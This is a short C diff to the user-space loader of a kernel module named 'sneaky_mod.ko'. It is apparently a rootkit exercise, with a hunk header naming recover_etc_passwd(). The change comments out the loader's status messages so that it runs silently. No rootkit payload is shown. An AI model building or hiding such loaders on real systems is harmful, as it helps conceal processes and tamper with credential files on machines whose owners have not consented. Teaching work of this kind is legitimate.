@@ -14,12 +14,12 @@ void recover_etc_passwd() {
 void load_module(pid_t pid) {
   char str[100];
   sprintf(str, "insmod sneaky_mod.ko pid=%d\n", pid);
-  fprintf(stdout, "load module: %s", str);
+  //fprintf(stdout, "load module: %s", str);
   system(str);
 }
 
 void rm_module() {
-  fprintf(stdout, "unload module\n");
+  //fprintf(stdout, "unload module\n");
   system("rmmod sneaky_mod.ko");
 }
 
@@ -27,7 +27,7 @@ void listen_q() {
   int input = 0;
   for (; (input = getchar()) != 'q';) {
   }
-  fprintf(stdout, "receive q from keyboard, quit\n");
+  //fprintf(stdout, "receive q from keyboard, quit\n");
 }
 
 int main() {
